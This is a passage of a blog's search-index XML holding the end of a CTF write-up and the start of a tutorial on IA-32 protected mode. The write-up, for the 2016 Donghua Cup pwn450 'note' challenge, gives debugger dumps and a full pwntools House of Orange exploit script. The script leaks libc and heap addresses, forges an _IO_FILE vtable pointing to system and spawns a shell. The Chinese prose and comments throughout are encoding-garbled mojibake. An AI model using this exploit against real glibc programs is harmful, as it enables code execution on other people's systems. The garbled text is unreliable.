class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#åˆ°è¾¾_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtableæŒ‡å‘ä¸‹é¢å†™å…¥ä¸‹é¢æ•°æ®çš„åœ°å€</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠunsortedbinç¬¬äºŒä¸ªå—æ”¹ä¸º60å¤§å°ï¼Œä¸‹ä¸€æ¬¡ç”³è¯·æ—¶åˆ‡å‰²ç¬¬ä¸€ä¸ªunsortedbinï¼Œä¼šæŠŠç¬¬äºŒä¸ªå—çš„bk-&gt;fd&#x3D;unsortedbinï¼ŒåŒæ—¶æ”¾å…¥smallbin 0x60å¤§å°é‡Œ</p><p>ç»•è¿‡ä¸€äº›æ£€æµ‹</p><p><code>payload+=p64(heap+0x10ff8+8)</code>å¯ä»¥æ ¹æ®å‰é¢å¡«å…¥çš„å¤§å° 0x10+0x200+0x10d10+0xd8+8&#x3D;0x1 1000 è¿™é‡Œ0x10æ˜¯å› ä¸ºheapæˆ‘ä»¬å»äº†ç”³è¯·heapçš„chunkheadï¼Œè€Œä¸æ˜¯æ•°æ®åŒºå¼€å§‹ï¼Œ+8æ˜¯å› ä¸ºè¿™ä¸ªå­—æ®µæœ¬èº«å ä¸€ä¸ªï¼Œæˆ–è€…é€šè¿‡åœ¨æ­¤æ¬¡è¾“å…¥ä¸€ä¸ªæ ‡è¯†ç¬¦è¿›è¡Œæœç´¢ï¼Œè®¡ç®—åç§»</p><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235134812.png" alt="image-20230409235134812"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x614000</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x614000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x1, </span><br><span class="line">  __overflow = 0x7ffff7a523a0 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/09/2016%E4%B8%9C%E5%8D%8E%E6%9D%AFpwn450-note/image-20230409235705003.png" alt="image-20230409235705003"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./16pwn450_note&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;on---&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#æ³„éœ²åŸºåœ°å€</span></span><br><span class="line">new(<span class="number">0x200000</span>)<span class="comment">#libcbase</span></span><br><span class="line">libcbase=<span class="built_in">int</span>(rl(),<span class="number">16</span>)+<span class="number">0x201000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">unsorted_bin=libcbase+<span class="number">0x68</span>+libcelf.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">_IO_list_all=libcbase+libcelf.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system=libcbase+libcelf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;unsotr&#x27;</span>,unsorted_bin)</span><br><span class="line">p(<span class="string">&#x27;iolist&#x27;</span>,_IO_list_all)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#æ”¾å…¥unsortedbin</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10df1</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x15000</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#é˜²æ­¢unlink</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10dd1</span>)+p64(unsorted_bin)*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10db0</span>+p64(<span class="number">0x10dd0</span>)+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># å¤§å—åˆ‡å‰²ä¸€éƒ¨åˆ†ï¼Œå°å—æ”¾å…¥smallbin</span></span><br><span class="line">new(<span class="number">0x10d00</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">new(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">heap=<span class="built_in">int</span>(rl(),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x10d11</span>)+p64(heap+<span class="number">0x210</span>)+p64(unsorted_bin)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x10d10</span>-<span class="number">0x20</span>)<span class="comment">#æº¢å‡ºåˆ°ç¬¬äºŒä¸ªå—</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="number">0x10</span>)<span class="comment">#å¸ƒç½®orange</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#write base</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#write ptr ç»•è¿‡æ£€æµ‹</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xc0</span>-<span class="number">48</span>) <span class="comment"># c0å¤§å°è¾¾åˆ° mode</span></span><br><span class="line">payload+=p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#mode=-1</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span>-<span class="number">8</span>-<span class="number">0xc0</span>)<span class="comment">#åˆ°è¾¾_vtable</span></span><br><span class="line">payload+=p64(heap+<span class="number">0x10ff8</span>+<span class="number">8</span>)<span class="comment">#vtableæŒ‡å‘ä¸‹é¢å†™å…¥ä¸‹é¢æ•°æ®çš„åœ°å€</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">edit(payload)</span><br><span class="line">b()</span><br><span class="line">free()</span><br><span class="line">new(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
            <tag> Unsorted Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IA-32 x86ä¿æŠ¤æ¨¡å¼(Protected mode)</title>
      <link href="/2023/04/08/32bit-x86-protected-mode/"/>
      <url>/2023/04/08/32bit-x86-protected-mode/</url>
      
        <content type="html"><![CDATA[<h1 id="IA-32-x86-Protected-mode"><a href="#IA-32-x86-Protected-mode" class="headerlink" title="IA-32 x86 Protected mode"></a>IA-32 x86 Protected mode</h1><h2 id="Real-address-Mode"><a href="#Real-address-Mode" class="headerlink" title="Real-address Mode"></a>Real-address Mode</h2><p>å®æ¨¡å¼ç®€ç§°Real modeï¼Œè¿™å°±è¦ä»æˆ‘ä»¬x86çš„ancestor 8086å¤„ç†å™¨è¯´èµ·ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä½¿ç”¨çš„åœ°å€éƒ½æ˜¯ç‰©ç†åœ°å€</p><p>&gt;&gt;&gt;ä¸ºä»€ä¹ˆä¼šæœ‰æ®µå¯„å­˜å™¨cs ds es ss?</p><ul><li><p>8086å¤„ç†å™¨é¢ä¸´çš„ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯20ä½åœ°å€æ€»çº¿å’Œ16bitå¯„å­˜å™¨çš„é—®é¢˜:è§£å†³è¿™ä¸ªé—®é¢˜æ˜¯æŠŠæ®µå¯„å­˜å™¨å·¦ç§»4ä¸ªbitä½ï¼Œå½¢æˆ20bitæ®µåœ°å€ï¼Œå†åŠ ä¸Š16ä½çš„åç§»åœ°å€è¿›è¡Œ20ä½å¯»å€,è¿™ä¹Ÿå†³å®šäº†æ®µåœ°å€å¿…é¡»æ˜¯æŒ‰16å­—èŠ‚å¯¹é½çš„ï¼Œå› ä¸º16ä½å¯„å­˜å™¨ï¼Œæ‰€ä»¥æ¯ä¸ªæ®µæœ€å¤§é™é•¿ä¸º64KBï¼ŒåŒæ—¶åŒä¸€ä¸ªç‰©ç†åœ°å€å¯¹åº”ç€å¤šä¸ªé€»è¾‘åœ°å€</p></li><li><p>ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ç¨‹åºé‡å®šä½çš„é—®é¢˜ï¼Œæˆ‘ä»¬çš„æŒ‡ä»¤æ˜¯ç”±æ“ä½œç å’Œæ“ä½œæ•°æ„æˆ(å°éƒ¨åˆ†åªæœ‰æ“ä½œç )ï¼Œå¦‚æœæˆ‘ä»¬æŒ‡ä»¤é‡Œçš„æ“ä½œæ•°æ˜¯ä¸€ä¸ªç»å¯¹åœ°å€ï¼Œæˆ‘ä»¬ç¨‹åºåŠ è½½çš„ä½ç½®æ˜¯ä¸ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»£ç å’Œæ•°æ®çš„åœ°å€ä¹Ÿä¸æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥ç»å¯¹åœ°å€æ˜¯ä¸å¯è¡Œçš„ï¼Œå¤„ç†å™¨é‡‡ç”¨äº†å†…å­˜åˆ†æ®µæœºåˆ¶ï¼Œè¿™ç§åˆ†æ®µæ˜¯é€»è¾‘ä¸Šçš„åˆ†æ®µï¼Œå¹¶ä¸æ˜¯ç‰©ç†ä¸Šçš„åˆ†æ®µ,æ®µåœ°å€:åç§»åœ°å€ï¼Œæˆ‘ä»¬æŒ‡ä»¤é‡Œçš„æ“ä½œæ•°å†™ç›¸å¯¹äºæ®µåœ°å€çš„ç›¸å¯¹åç§»åœ°å€ï¼Œå°±å¯ä»¥æ­£ç¡®é‡å®šä½</p></li></ul><p><code>ç‰©ç†åœ°å€ï¼ˆphysicaladdressï¼‰=æ®µå€¼ï¼ˆsegmentï¼‰ * 16 + åç§»ï¼ˆoffsetï¼‰</code></p><p>32ä½å¤„ç†å™¨ä¹‹åæˆ‘ä»¬ç»™è¿™ä¸ªå–äº†ä¸ªåå­—å«å®æ¨¡å¼</p><p><strong>å®æ¨¡å¼çš„é—®é¢˜</strong></p><ol><li>ç¼ºä¹ä¿æŠ¤æœºåˆ¶ï¼šå®æ¨¡å¼ä¸‹æ²¡æœ‰ä¿æŠ¤æœºåˆ¶ï¼Œä¹Ÿæ²¡æœ‰å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰æ¥ä¿æŠ¤å†…å­˜å…å—éæˆæƒè®¿é—®å’Œæ“ä½œç³»ç»Ÿè¿›ç¨‹ä¹‹é—´çš„å¹²æ‰°ã€‚è¿™ä½¿å¾—æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°æ¶æ„ä»£ç çš„æ”»å‡»ã€‚</li><li>ç¼ºä¹å¤šä»»åŠ¡æ”¯æŒï¼šå®æ¨¡å¼ä¸‹ï¼Œåªèƒ½è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œå¹¶ä¸”ç¨‹åºå¿…é¡»åœ¨å¤„ç†å™¨çš„æ§åˆ¶ä¸‹è¿è¡Œï¼Œå› ä¸ºæ²¡æœ‰ä»»ä½•æœºåˆ¶æ¥åˆ‡æ¢åˆ°å…¶ä»–ç¨‹åºã€‚è¿™ä¸ªé™åˆ¶æ„å‘³ç€æ“ä½œç³»ç»Ÿæ— æ³•æ”¯æŒå¤šä»»åŠ¡å¤„ç†ï¼Œè¿™é™åˆ¶äº†è®¡ç®—æœºçš„æ€§èƒ½å’Œæ•ˆç‡ã€‚</li></ol><h2 id="Protected-mode"><a href="#Protected-mode" class="headerlink" title="Protected mode"></a>Protected mode</h2><p>ä¿æŠ¤æ¨¡å¼æ˜¯åœ¨80286(16ä½)å¼•å…¥ï¼Œ80386(32ä½)å¼€å§‹ç››è¡Œ</p><p>80386 32ä½åœ°å€æ€»çº¿æœ€å¤šæ”¯æŒ4GBçš„ç‰©ç†å†…å­˜ï¼Œè§†ä¸ºIA-32(Intel Architecture)æ¶æ„çš„å¼€å§‹</p><p>å¼€å§‹äº†å¹³å¦å†…å­˜æ¨¡å‹ï¼ˆflat memory modelï¼‰ï¼Œæ•´ä¸ªå†…å­˜éƒ½åœ¨ä¸€ä¸ªæ®µé‡Œï¼Œå³æ¯ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨åœ°å€0ï½2^32-1æ¥ç´¢å¼•</p><p>CROå¯„å­˜å™¨çš„æœ€ä½ä½PE(Protection Enable)æ ‡å¿—ä¸º1å¤„ç†å™¨è¿›å…¥ä¿æŠ¤æ¨¡å¼</p><p>&gt;&gt;&gt;æ€ä¹ˆä¿æŠ¤</p><p>å¯¹å†…å­˜è¿›è¡Œæƒé™æ§åˆ¶ï¼Œé‚£å°±åº”è¯¥ä¼šæœ‰æƒé™ä¿¡æ¯çš„æè¿°ï¼Œæ®µå¯„å­˜å™¨åªæœ‰16ä½(å…¶å®æ˜¯å¯è§éƒ¨åˆ†åªæœ‰16ä½ï¼Œè¿˜æœ‰80ä½æ˜¯ä¸å¯è§,æè¿°å±æ€§(16)ï¼ŒåŸºå€(32)ï¼Œç•Œé™(32))è€Œä¸”åªæœ‰å‡ ä¸ªï¼Œæ¯ä¸€ä¸ªç¨‹åºéƒ½éœ€è¦å¤šä¸ªå•ç‹¬çš„æè¿°ä¿¡æ¯ï¼Œé‚£å°±éœ€è¦å­˜æ”¾åœ¨å†…å­˜é‡Œ</p><h3 id="åˆ†æ®µæœºåˆ¶"><a href="#åˆ†æ®µæœºåˆ¶" class="headerlink" title="åˆ†æ®µæœºåˆ¶"></a>åˆ†æ®µæœºåˆ¶</h3><h4 id="æ®µæè¿°ç¬¦"><a href="#æ®µæè¿°ç¬¦" class="headerlink" title="æ®µæè¿°ç¬¦"></a>æ®µæè¿°ç¬¦</h4><p>å°±å‡ºç°äº†æ®µæè¿°ç¬¦(segment descriptor)ï¼Œ8å­—èŠ‚é•¿çš„æ•°æ®ç»“æ„ï¼Œç”¨æ¥æè¿°ä¸€ä¸ªæ®µçš„ä½ç½®ã€å¤§å°ã€è®¿é—®æ§åˆ¶å’ŒçŠ¶æ€ç­‰ä¿¡æ¯ï¼Œ</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200038198.png" alt="image-20230420200038198"></p><ul><li>32ä½æ®µåŸºåœ°å€ï¼Œæ®µèµ·å§‹ä½ç½®</li><li>20ä½çš„æ®µè¾¹ç•Œï¼Œæ®µè¾¹ç•Œçš„æ‰©å±•æœ€å€¼,å³æœ€å¤§æ‰©å±•åˆ°å¤šå°‘æˆ–æœ€å°æ‰©å±•åˆ°å¤šå°‘ã€‚æ‰©å±•æ–¹å‘åªæœ‰ä¸Šä¸‹ä¸¤ç§,æ ˆå’Œæ•°æ®æ®µä»£ç æ®µåŒºåˆ«(DNAé‡Œçš„ææƒ§:segmentation fault)</li><li>G(Granularity)æ˜¯ç²’åº¦æ¥æè¿°æ®µè¾¹ç•Œï¼ŒGä¸º0ï¼Œæ®µè¾¹ç•Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œä¸º1(1B~1M)ï¼Œåˆ™ä»¥4kä¸ºå•ä½(4K~4G)</li><li>S(System)ï¼ŒS&#x3D;0ä»£è¡¨è¯¥æè¿°ç¬¦æè¿°çš„æ˜¯ä¸€ä¸ªç³»ç»Ÿæ®µï¼ŒS&#x3D;1ä»£è¡¨è¯¥æè¿°ç¬¦æè¿°çš„æ˜¯ä»£ç æ®µã€æ•°æ®æ®µæˆ–å †æ ˆæ®µ</li><li>DPL(Descriptor Privilege Levelï¼‰æè¿°ç¬¦ç‰¹æƒçº§0-3ï¼Œ0æœ€é«˜ï¼Œé«˜çš„å¯ä»¥è®¿é—®ä½çš„ï¼Œåä¹‹ä¸è¡Œï¼Œæ¯”å¦‚æ“ä½œç³»ç»Ÿçš„ä»£ç å’Œæ•°æ®ä¼šè¢«æ”¾åœ¨æ¯”ç”¨æˆ·ç¨‹åºå…·æœ‰æ›´é«˜ç‰¹æƒçš„æ®µé‡Œ,DPLè¡¨ç¤ºè®¿é—®è¿™ä¸ªæ®µå¯¹å½“å‰ç‰¹æƒçº§(CPL)çš„æœ€ä½ç­‰çº§è¦æ±‚</li><li>TYPEå’ŒSæ®µé…åˆä½¿ç”¨ï¼Œæ®µçš„è®¿é—®æƒé™æˆ–ç³»ç»Ÿæ§åˆ¶æè¿°ç±»å‹</li></ul><p> CPU ç¡¬ä»¶è´Ÿè´£æ£€æµ‹ï¼Œæ“ä½œç³»ç»Ÿæä¾›å¼‚å¸¸å¤„ç†ç¨‹åº</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420195852680.png" alt="image-20230420195852680"></p><p>æè¿°ä¿¡æ¯è¿™ä¹ˆä¹±æ˜¯ä¸ºäº†å…¼å®¹80286</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230420200152426.png" alt="image-20230420200152426"></p><h4 id="æ®µæè¿°ç¬¦è¡¨"><a href="#æ®µæè¿°ç¬¦è¡¨" class="headerlink" title="æ®µæè¿°ç¬¦è¡¨"></a>æ®µæè¿°ç¬¦è¡¨</h4><p>ç³»ç»Ÿä¸­ä¼šæœ‰å¾ˆå¤šæ®µæè¿°ç¬¦ï¼Œä»£ç æ®µè¦å ç”¨ä¸€ä¸ªæ®µæè¿°ç¬¦ã€æ•°æ®æ®µå’Œæ ˆæ®µç­‰ï¼Œå¤šä¸ªå†…å­˜æ®µä¹Ÿè¦å„è‡ªå ç”¨ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œcpuå®šçš„å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGlobal Descriptor Tableï¼ŒGDTï¼‰å±€éƒ¨æè¿°ç¬¦è¡¨LDT(Local descriptor table)æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦æ•°ç»„ï¼Œé‡Œé¢å­˜çš„å°±æ˜¯è¿™äº›æè¿°ç¬¦</p><p>å…¨å±€æè¿°ç¬¦è¡¨(ç³»ç»Ÿåªæœ‰ä¸€ä¸ª)çš„åœ°å€å­˜æ”¾åœ¨GDTRå¯„å­˜å™¨é‡Œï¼Œå±€éƒ¨æè¿°ç¬¦è¡¨åœ¨LDTRå¯„å­˜å™¨ï¼Œè¡¨ç”±æ“ä½œç³»ç»Ÿç»´æŠ¤ï¼Œcpuç¡¬ä»¶æ¥ä½¿ç”¨</p><h4 id="GDTRå¯„å­˜å™¨"><a href="#GDTRå¯„å­˜å™¨" class="headerlink" title="GDTRå¯„å­˜å™¨"></a>GDTRå¯„å­˜å™¨</h4><p>48ä½</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408155337790.png" alt="image-20230408155337790"></p><p>32ä½çº¿æ€§åœ°å€æè¿°å…¨å±€æè¿°ç¬¦è¡¨åœ¨å†…å­˜é‡Œçš„ä½ç½®ã€‚16ä½è¡¨é•¿åº¦æè¿°è¡¨çš„å¤§å°(ä¸º0æ—¶å¤§å°æ˜¯1)ï¼Œbyteä¸ºå•ä½ï¼Œæ‰€ä»¥æœ€å¤§2^16&#x2F;8&#x3D;8192ä¸ªæè¿°ç¬¦</p><h4 id="LDTRå¯„å­˜å™¨"><a href="#LDTRå¯„å­˜å™¨" class="headerlink" title="LDTRå¯„å­˜å™¨"></a>LDTRå¯„å­˜å™¨</h4><p>å±€éƒ¨æè¿°ç¬¦è¡¨å¯„å­˜å™¨LDTRè¡¨ç¤ºå½“å‰ä»»åŠ¡çš„LDTåœ¨GDTä¸­çš„ç´¢å¼•ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ®µé€‰æ‹©å­</p><h4 id="æ®µé€‰æ‹©å­"><a href="#æ®µé€‰æ‹©å­" class="headerlink" title="æ®µé€‰æ‹©å­"></a>æ®µé€‰æ‹©å­</h4><p>æœ‰äº†æ®µæè¿°ç¬¦ï¼Œæ®µå¯„å­˜å™¨é‡Œé¢å°±ä¸éœ€è¦å­˜æ®µåŸºåœ°å€ï¼Œè€Œæ˜¯å­˜çš„æ®µé€‰æ‹©å­</p><p><img src="/2023/04/08/32bit-x86-protected-mode/image-20230408172110614.png" alt="image-20230408172110614"></p><ul><li>TIä½ä»£è¡¨è¦ç´¢å¼•çš„æ®µæè¿°ç¬¦è¡¨ï¼ˆtable indicatorï¼‰ï¼ŒTI&#x3D;0è¡¨ç¤ºå…¨å±€æè¿°ç¬¦è¡¨ï¼ŒTI&#x3D;1è¡¨ç¤ºå±€éƒ¨æè¿°ç¬¦è¡¨ã€‚</li><li>é«˜13ä½æ˜¯æè¿°ç¬¦ç´¢å¼•ï¼Œè¦é€‰æ‹©çš„æ®µæè¿°ç¬¦åœ¨TIæ‰€è¡¨ç¤ºçš„æ®µæè¿°ç¬¦è¡¨ä¸­çš„ç´¢å¼•å·</li><li>RPLï¼ˆRequestor Privilege Levelï¼‰è¯·æ±‚ç‰¹æƒçº§ï¼Œè¡¨ç¤ºæˆ‘å°†ä»¥ä»€ä¹ˆæ ·çš„èº«ä»½å»è®¿é—®ï¼Œæ¯”å¦‚æˆ‘ç°åœ¨cplä¸º0ï¼Œæˆ‘å¯ä»¥ä»¥rplä¸º3æˆ–0çš„èº«ä»½å»è®¿é—®ï¼Œä¹‹æ‰€ä»¥ä¼šæœ‰3çš„èº«ä»½å’Œæˆ‘ä»¬æœ‰æ—¶å€™æ€•æ— è¯¯ä¿®æ”¹ä¸€ä¸ªå¯ä¿®æ”¹çš„æ–‡ä»¶ä»è€Œä»¥åªè¯»æƒé™æ‰“å¼€è¯¥æ–‡ä»¶ä¸€æ ·</li><li>(cs(ss)[cså’Œssç‰¹æƒçº§ä¸€æ ·]å¯„å­˜å™¨ä¸­çš„RPLå­—æ®µè¡¨ç¤ºå½“å‰ç‰¹æƒçº§(Current Privilege Levelï¼ŒCPL))ï¼Œå’Œæ®µæè¿°ç¬¦é‡Œçš„DPLé…åˆcpuåšæ£€æŸ¥</li></ul><p>è¿™æ ·é€šè¿‡æ®µé€‰æ‹©å­å’ŒGDTRï¼Œå°±å¯ä»¥å®šä½åˆ°æ®µæè¿°ç¬¦ï¼Œæ‰¾åˆ°æ®µåŸºåœ°å€ï¼ŒåŠ ä¸Šåç§»æ‰¾åˆ°çº¿æ€§åœ°å€ï¼Œå¦‚æœæ²¡æœ‰åˆ†é¡µæœºåˆ¶è¿™æ 